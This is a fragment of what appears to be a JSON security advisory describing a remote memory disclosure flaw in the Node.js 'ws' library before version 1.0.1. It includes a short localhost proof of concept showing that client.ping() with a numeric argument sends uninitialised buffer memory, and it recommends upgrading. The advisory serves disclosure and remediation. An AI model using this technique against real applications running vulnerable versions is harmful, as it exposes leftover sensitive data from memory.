  "summary": "Remote Memory Disclosure in ws",
  "details": "Versions of `ws` prior to 1.0.1 are affected by a remote memory disclosure vulnerability.\n\nIn certain rare circumstances, applications which allow users to control the arguments of a `client.ping()` call will cause `ws` to send the contents of an allocated but non-zero-filled buffer to the server. This may disclose sensitive information that still exists in memory after previous use of the memory for other tasks.\n\n\n\n## Proof of Concept\n```\nvar ws = require('ws')\n\nvar server = new ws.Server({ port: 9000 })\nvar client = new ws('ws://localhost:9000')\n\nclient.on('open', function () {\n  console.log('open')\n  client.ping(50) // this sends a non-zeroed buffer of 50 bytes\n\n  client.on('pong', function (data) {\n    console.log('got pong')\n    console.log(data) // Data from the client. \n  })\n})\n```\n\n\n## Recommendation\n\nUpdate to version 1.0.1 or greater.",
